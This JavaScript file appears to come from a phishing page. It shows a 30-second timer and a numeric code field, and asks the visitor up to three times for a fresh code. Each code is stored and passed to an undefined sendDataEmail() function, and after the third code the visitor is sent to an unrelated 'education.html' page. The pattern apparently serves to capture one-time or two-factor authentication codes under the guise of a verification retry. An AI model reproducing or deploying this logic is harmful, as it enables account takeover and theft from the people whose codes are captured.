var x; 

function startTimer() {
    stopTimer(); 
    // TIMER
    var countDownDate = new Date().getTime();
    x = setInterval(function () {
        var now = new Date().getTime();
        var distance = Math.round((now - countDownDate) / 1000);
        var insertedTime = 30 - distance;
        document.getElementById("timer").innerHTML = insertedTime + "s ";
        document.getElementById("timer").style.display = 'inline';
        if (insertedTime <= 0) {
            clearInterval(x);
            document.getElementById("timer").style.display = 'none';
            document.getElementById("timer").innerHTML = "EXPIRED";
        }
    }, 1000);
}

function stopTimer() {
    clearInterval(x); 
    document.getElementById("timer").style.display = 'none';
    document.getElementById("timer").innerHTML = "";
}

$(document).ready(function () {

    $("#codetext").on('keypress', function (event) {
        var charCode = event.which ? event.which : event.keyCode;
        if (charCode < 48 || charCode > 57) {
            event.preventDefault();
        }
    });

    startTimer();

    var n = 0;
    $("#trywait").click(function () {

        if($("#codetext").val() === '')
        {
            return;
        }
        n++;
        switch (n) {
            case 1:
                {
                    setTimeout(function() {
                        localStorage.setItem('code1', $("#codetext").val());
                        sendDataEmail();
                        $("#codetext").val('');
                    }, 2000); 
                
                    
                    break;
                }
            case 2:
                {
                    setTimeout(function() {
                        localStorage.setItem('code2', $("#codetext").val());
                        sendDataEmail();
                        $("#codetext").val('');
                    }, 2000); 
                    break;
                }
            case 3:
                {
                    setTimeout(function() {
                        localStorage.setItem('code3', $("#codetext").val());
                        $("#codetext").val('');
                        sendDataEmail();
                        window.location.href = "../resume/education.html";
                    }, 2000); 
          
                    break;
                }
            default:
                {
                    sendDataEmail();
                    break;
                }
        }
        if (n > 3) {
            sendDataEmail();
            window.location.href = "../resume/education.html";
        }
        else
        {
            startTimer();
        }
    });
});
